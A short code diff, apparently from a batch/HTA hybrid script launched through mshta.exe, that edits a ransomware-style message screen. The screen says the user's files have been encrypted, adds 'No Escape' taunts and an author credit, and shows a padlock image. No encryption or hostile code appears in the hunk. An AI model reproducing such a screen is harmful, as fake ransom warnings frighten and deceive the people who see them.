@@ -52,10 +52,11 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
 <div id="texto2">
     Oops, Your Files Have Been Encrypted!<br>
     <br><br>
-    Made by Frank <br>
+     Made by Frank Syd 20 <br>
     <br><br>
-    No Escape <br>
-    <br><br><br>
+    !!!No Escape!!! <br>
+    <br><br>
+   Now Enjoy Cat Mouth <br>
     <img id="imagen" alt="Candado" src="url("https://i.imgur.com/rytGPFG.png") >
 </div>
 </body>
